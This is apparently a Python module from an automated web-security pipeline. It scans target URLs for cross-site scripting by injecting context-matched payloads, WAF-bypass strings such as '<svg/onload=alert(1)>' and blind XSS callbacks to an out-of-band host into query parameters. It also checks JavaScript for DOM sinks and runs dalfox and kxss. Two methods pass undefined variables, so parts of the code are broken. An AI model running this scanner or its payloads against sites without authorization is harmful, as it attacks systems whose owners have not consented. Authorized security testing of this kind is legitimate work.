#!/usr/bin/env python3
# modules/step07_xss.py — XSS Detection V7 (UPGRADED)
# Now uses: xss_payloads_db.py (72 payloads), context detection, Ollama AI
# Sources: XSS Payloads Book (665 payloads), Bug Bounty Bootcamp (Ch6 methodology)
# MilkyWay Intelligence | Author: Sharlix + M7AI

import os, re, urllib.request, urllib.parse, urllib.error, threading
from core.utils import count_lines, safe_read

# ── Import new payload DB (from XSS book) ────────────────────────────────────
try:
    from engines.xss_payloads_db import (
        LOW_FP_PAYLOADS, MED_FP_PAYLOADS, BLIND_PAYLOADS,
        detect_context, get_payloads_for_context
    )
    PAYLOAD_DB_AVAILABLE = True
except ImportError:
    PAYLOAD_DB_AVAILABLE = False

# ── Context probe marker ──────────────────────────────────────────────────────
CONTEXT_PROBE = "M7CTXPROBE9x8z"

# ── Confirmed XSS indicators from Bug Bounty Bootcamp ─────────────────────────
CONFIRMED_PATTERNS = [
    re.compile(r'<svg[^>]*(onload|onerror)\s*=', re.I),
    re.compile(r'<img[^>]*onerror\s*=', re.I),
    re.compile(r'<script[^>]*>.*alert', re.I | re.DOTALL),
    re.compile(r'javascript:alert', re.I),
    re.compile(r'<details[^>]*ontoggle\s*=', re.I),
    re.compile(r'<iframe[^>]*onload\s*=', re.I),
]

# ── False positive filters (Bug Bounty Bootcamp: encoded = not exploitable) ───
FP_PATTERNS = [
    "&lt;script", "&lt;svg", "&amp;lt;", "\\u003c",
    "%3Cscript", "%3Csvg",
]

DOM_SINKS = [
    r'innerHTML\s*=', r'document\.write\s*\(', r'eval\s*\(',
    r'setTimeout\s*\(', r'setInterval\s*\(', r'location\.href\s*=',
    r'location\.assign\s*\(', r'\.insertAdjacentHTML\s*\(',
    r'window\.open\s*\(', r'outerHTML\s*=',
]
DOM_SOURCES = [
    r'location\.search', r'location\.hash', r'location\.href',
    r'document\.referrer', r'document\.URL', r'window\.name',
    r'URLSearchParams',
]

XSS_PRONE_PARAMS = {
    "q","search","query","s","input","text","comment","msg","message",
    "name","title","description","content","body","value","data","html",
    "username","user","feedback","note","subject","error","info","term",
    "keyword","k","lang","redirect","url","next","return","callback","ref",
    "page","p","id","cat","tag","type","view","action","template","theme",
}


class Step07Xss:
    def __init__(self, pipeline):
        self.p   = pipeline
        self.log = pipeline.log
        self._lock = threading.Lock()

    def run(self):
        p    = self.p
        urls = p.files["urls"]
        out  = p.files["xss_results"]
        t    = p.tmgr.get
        found = 0

        if not os.path.isfile(urls) or count_lines(urls) == 0:
            self.log.warn("XSS: no URLs — skipping"); return

        cookie_flag = f'--cookie "{p.args.cookie}"' if getattr(p.args,"cookie",None) else ""
        self.log.info("XSS V7: context-aware scanning (payload DB + dalfox + DOM)")

        # ── Step 1: Build XSS-prone param list ───────────────────────────────
        xss_params = os.path.join(p.out, f"{p.prefix}_xss_params.txt")
        p.shell(f"cat {urls} 2>/dev/null | gf xss > {xss_params} 2>/dev/null")
        if count_lines(xss_params) == 0:
            self._extract_xss_params(urls, xss_params)

        n_params = count_lines(xss_params)
        if n_params == 0:
            self.log.warn("XSS: no parameterized URLs found"); return
        self.log.info(f"  ↳ XSS candidates: {n_params}")

        # ── Step 2: dalfox (deep scan) ───────────────────────────────────────
        p.shell(
            f"dalfox file {xss_params} --skip-bav --silence --no-color "
            f"{cookie_flag} -o {out} 2>/dev/null",
            label="dalfox xss", timeout=t("dalfox")
        )
        found += self._parse_dalfox(out)

        # ── Step 3: kxss (fast reflection check) ─────────────────────────────
        p.shell(
            f"cat {xss_params} | head -200 | kxss 2>/dev/null",
            label="kxss reflection", append_file=out, timeout=120
        )

        # ── Step 4: Context-aware manual testing (from payload DB) ───────────
        if PAYLOAD_DB_AVAILABLE:
            found += self._context_aware_test(xss_params, out)
        else:
            found += self._legacy_waf_bypass(xss_params, out)

        # ── Step 5: DOM XSS analysis ──────────────────────────────────────────
        js_file = p.files.get("js_files","")
        if os.path.isfile(js_file):
            found += self._check_dom_xss(js_file)

        # ── Step 6: Blind XSS (OOB) ──────────────────────────────────────────
        if p.oob and PAYLOAD_DB_AVAILABLE:
            self._inject_blind_xss(xss_params)

        # ── Step 7: Stored XSS marker check ──────────────────────────────────
        found += self._check_stored_xss(xss_params)

        self.log.success(f"XSS V7: {found} confirmed findings")

    # ─────────────────────────────────────────────────────────────────────────
    # STEP 4: Context-Aware Testing (Bug Bounty Bootcamp methodology)
    # ─────────────────────────────────────────────────────────────────────────
    def _context_aware_test(self, params_file: str, out_file: str) -> int:
        """
        Bug Bounty Bootcamp Ch6: Test each parameter in context.
        1. Probe with marker → detect HTML/attr/JS context
        2. Pick best payloads for that context
        3. Test low-FP payloads first
        """
        targets = safe_read(params_file)[:50]
        found   = 0

        for url in targets:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                if not qs: continue
            except Exception:
                continue

            for param in list(qs.keys())[:4]:
                # Phase A: Context probe
                ctx = self._detect_param_context(url, parsed, qs, param)

                # Phase B: Get best payloads for this context
                payloads = get_payloads_for_context(ctx, count=8, waf_bypass=False)

                # Phase C: Test each payload
                for payload_info in payloads:
                    payload = payload_info["payload"]
                    bypass  = payload_info["bypass_type"]
                    fp_risk = payload_info["fp_risk"]

                    test_url = self._inject_param(url, parsed, qs, param, payload)
                    resp = self._fetch(test_url)
                    if not resp: continue

                    body   = resp.get("body","")
                    status = resp.get("status", 0)

                    # FP check: HTML encoded = not exploitable
                    if self._is_encoded(body, payload):
                        continue

                    # Confirmed patterns check
                    if self._is_confirmed(body, payload):
                        detail = f"XSS confirmed: ctx={ctx} bypass={bypass} param={param}"

                        # Ollama AI verification
                        ai_verdict = self._ai_verify(
                            "XSS", test_url, body, payload
                        )
                        if ai_verdict.get("verdict") == "false_positive":
                            continue

                        sev = "high"
                        if fp_risk == "low":
                            sev = "high"
                        elif fp_risk == "medium":
                            sev = "medium"

                        with open(out_file,"a") as f:
                            f.write(f"XSS_CONTEXT: {test_url} | {detail}\n")
                        self.p.add_finding(
                            severity  = sev,
                            vuln_type = "XSS",
                            url       = test_url,
                            detail    = detail,
                            tool      = "xss-context-engine",
                            payload   = payload,
                            response  = body[:500],
                        )
                        found += 1
                        break  # one payload confirmed per param

                self.p.bypass.jitter()

        return found

    def _detect_param_context(self, url, parsed, qs, param) -> str:
        """Send context probe and detect HTML/attr/JS context."""
        probe_url = self._inject_param(url, parsed, qs, param, CONTEXT_PROBE)
        resp = self._fetch(probe_url)
        if resp and resp.get("body"):
            return detect_context(resp["body"], CONTEXT_PROBE)
        return "html"  # default

    def _inject_param(self, url, parsed, qs, param, value) -> str:
        """Build test URL with injected value for specific param."""
        test_qs = {k: list(v) for k, v in qs.items()}
        test_qs[param] = [value]
        return urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True))
        )

    def _is_encoded(self, body: str, payload: str) -> bool:
        """Bug Bounty Bootcamp: encoded reflection = false positive."""
        if not body: return False
        for fp_pat in FP_PATTERNS:
            if fp_pat in body:
                return True
        # Check if payload's critical chars are HTML-encoded
        if "<" in payload and "&lt;" in body:
            return True
        return False

    def _is_confirmed(self, body: str, payload: str) -> bool:
        """Check if payload appears unencoded (real XSS)."""
        if not body: return False
        # Direct reflection check
        if payload in body or payload.lower() in body.lower():
            if not self._is_encoded(body, payload):
                return True
        # Confirmed pattern check
        for pattern in CONFIRMED_PATTERNS:
            if pattern.search(body):
                return True
        return False

    def _ai_verify(self, vuln_type: str, url: str, body: str, payload: str) -> dict:
        """Use Ollama AI or offline fallback to verify finding."""
        ai = getattr(self.p, "ollama_ai", None) or getattr(self.p, "offline_ai", None)
        if ai:
            try:
                return ai.analyze_response(vuln_type, url, body, payload)
            except Exception:
                pass
        return {"verdict": "potential", "confidence": 0.5}

    # ─────────────────────────────────────────────────────────────────────────
    # DOM XSS (Bug Bounty Bootcamp Ch6: DOM-based XSS)
    # ─────────────────────────────────────────────────────────────────────────
    def _check_dom_xss(self, js_file: str) -> int:
        """Check JS files for source→sink flows (DOM XSS)."""
        found = 0
        js_urls = safe_read(js_file)[:20]
        for url in js_urls:
            try:
                req  = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                resp = urllib.request.urlopen(req, timeout=10)
                js   = resp.read(150000).decode("utf-8", errors="ignore")
            except Exception:
                continue
            sources = [s for s in DOM_SOURCES if re.search(s, js)]
            sinks   = [s for s in DOM_SINKS   if re.search(s, js)]
            if sources and sinks:
                detail = f"DOM XSS flow: {sources[0]} → {sinks[0]}"
                self.p.add_finding("high","DOM_XSS",url,detail,"dom-analyzer", response=response, payload=payload)
                found += 1
        return found

    # ─────────────────────────────────────────────────────────────────────────
    # Blind XSS (Bug Bounty Bootcamp: OOB callbacks)
    # ─────────────────────────────────────────────────────────────────────────
    def _inject_blind_xss(self, params_file: str):
        """Inject OOB blind XSS payloads."""
        targets = safe_read(params_file)[:15]
        oob_host = self.p.oob.get_payload("blind_xss","xss")
        count = 0
        for url in targets:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                for param in list(qs.keys())[:2]:
                    for blind_pl, _, _ in BLIND_PAYLOADS[:3]:
                        payload = blind_pl.replace("OOB_HOST", oob_host)
                        test_url = self._inject_param(url,parsed,qs,param,payload)
                        self._fetch(test_url, timeout=5)
                        count += 1
            except Exception:
                pass
        if count:
            self.log.info(f"  ↳ Blind XSS: {count} payloads injected → monitor Interactsh")

    # ─────────────────────────────────────────────────────────────────────────
    # Stored XSS marker check
    # ─────────────────────────────────────────────────────────────────────────
    def _check_stored_xss(self, params_file: str) -> int:
        """
        Inject a harmless marker, revisit page later to detect stored XSS.
        Bug Bounty Bootcamp: stored XSS persists across requests.
        """
        MARKER = "M7STORED8X7S"
        targets = safe_read(params_file)[:10]
        injected_urls = []
        found = 0

        # Phase 1: Inject marker
        for url in targets[:5]:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                for param in list(qs.keys())[:1]:
                    payload = f'<span data-m7="{MARKER}">'
                    test_url = self._inject_param(url,parsed,qs,param,payload)
                    resp = self._fetch(test_url)
                    if resp and resp.get("status",0) in (200,201):
                        injected_urls.append((url, test_url))
            except Exception:
                pass

        # Phase 2: Re-visit base URL and check if marker persists
        for orig_url, _ in injected_urls:
            resp = self._fetch(orig_url)
            if resp and MARKER in resp.get("body",""):
                detail = f"Stored XSS marker persisted at {orig_url}"
                self.p.add_finding("high","STORED_XSS",orig_url,detail,"stored-xss-check", response=response, payload=payload)
                found += 1

        return found

    # ─────────────────────────────────────────────────────────────────────────
    # Helper: Extract XSS-prone params when gf finds nothing
    # ─────────────────────────────────────────────────────────────────────────
    def _extract_xss_params(self, urls_file: str, out_file: str):
        if not os.path.isfile(urls_file): return
        added = set()
        with open(urls_file) as f:
            lines = [l.strip() for l in f if l.strip()]
        with open(out_file,"w") as out:
            for url in lines[:3000]:
                if "?" not in url: continue
                try:
                    qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
                    for k in qs:
                        if k.lower() in XSS_PRONE_PARAMS and url not in added:
                            out.write(url+"\n"); added.add(url); break
                except Exception:
                    pass

    def _legacy_waf_bypass(self, params_file: str, out_file: str) -> int:
        """Fallback WAF bypass testing if payload DB not available."""
        PAYLOADS = [
            ('<svg/onload=alert(1)>', "svg"),
            ('<img src=x onerror=alert(1)>', "img"),
            ('<details open ontoggle=alert(1)>', "details"),
            ('<ScRiPt>alert(1)</ScRiPt>', "case"),
        ]
        targets = safe_read(params_file)[:20]
        found = 0
        for url in targets:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                if not qs: continue
            except Exception:
                continue
            for param in list(qs.keys())[:2]:
                for payload, btype in PAYLOADS:
                    test_url = self._inject_param(url,parsed,qs,param,payload)
                    resp = self._fetch(test_url)
                    if not resp: continue
                    body = resp.get("body","")
                    if payload in body and not self._is_encoded(body, payload):
                        detail = f"XSS {btype} bypass param={param}"
                        self.p.add_finding("high","XSS",test_url,detail,"xss-bypass",payload=payload)
                        found += 1
                        break
        return found

    def _parse_dalfox(self, xss_out: str) -> int:
        """Parse dalfox output and add confirmed XSS findings."""
        if not os.path.isfile(xss_out): return 0
        found = 0
        with open(xss_out) as f:
            for line in f:
                line = line.strip()
                if not line: continue
                if "[V]" in line or "[POC]" in line or "VULN" in line.upper():
                    url = re.search(r'https?://\S+', line)
                    if url:
                        self.p.add_finding(
                            severity="high", vuln_type="XSS",
                            url=url.group(), detail=line[:120],
                            tool="dalfox", status="confirmed"
                        )
                        found += 1
        return found

    def _fetch(self, url: str, timeout: int = 8) -> dict:
        try:
            req  = urllib.request.Request(url, headers={
                "User-Agent": self.p.bypass.ua(),
                "Accept"    : "text/html,application/xhtml+xml,*/*",
            })
            resp = urllib.request.urlopen(req, timeout=timeout)
            body = resp.read(50000).decode("utf-8", errors="ignore")
            return {"status": resp.status, "body": body}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": ""}
        except Exception:
            return None
